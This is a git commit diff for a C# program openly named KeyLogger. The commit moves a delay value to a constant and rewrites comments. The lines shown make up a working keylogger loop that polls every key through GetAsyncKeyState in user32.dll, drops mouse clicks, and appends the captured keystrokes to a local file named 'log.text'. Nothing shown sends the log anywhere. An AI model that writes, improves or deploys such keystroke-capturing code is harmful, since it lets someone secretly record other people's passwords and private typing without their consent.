ef5cce4cda0002173e37ad203a3af735d8f9a78b
Henkje <henkje@pm.me>
2019-02-09 16:01:21 +0100

    Moved delay to const, and changed comments.

--- KeyLogger/Program.cs
+++ KeyLogger/Program.cs
@@ -1,5 +1,5 @@
 /* KeyLogger
- * Copyright (C) 2018  henkje (henkje@pm.me)
+ * Copyright (C) 2019  henkje (henkje@pm.me)
  * 
  * MIT license
  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
@@ -13,13 +13,16 @@
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace KeyLogger
 {
     class Program
     {
+        //Delay when no key is pressed
+        const short Delay = 50;
+
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
         private static string _Key = string.Empty;
@@ -30,23 +33,23 @@ namespace KeyLogger
 
             while (true)
             {
-                //loop evry key (i) and check if the key is pressed, if key is pressed add the key to string _Key
-                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);
+                for (int i = 0; i < Keys; i++)//Loop every key.
+                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
+                        _Key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.
 
-                //if no key is pressed, wait 50 miliseconds and then continue
-                //if you see to many cpu usage, increase 50
-                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }
+                //If no key is pressed, wait x milliseconds.
+                if (_Key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }
 
-                //key is pressed, continue
-                //remove LButton and RButton, these are mouse clicks
+                //Key is pressed, continue.
+                //Ingenore LButton and RButton, these are mouse clicks.
                 if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
                 if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }
 
-                _Key = _Key.Replace("Enter", Environment.NewLine);//replace Enter for a new line
-                _Key = _Key.Replace("Space", " ");//replace Spave for a space
+                _Key = _Key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
+                _Key = _Key.Replace("Space", " ");//Replace Space for a real space.
 
-                File.AppendAllText("log.text", _Key);//write key to file
-                _Key = string.Empty;//clear key
+                File.AppendAllText("log.text", _Key);//Write key to file.
+                _Key = string.Empty;//clear key.
             }
         }
     }
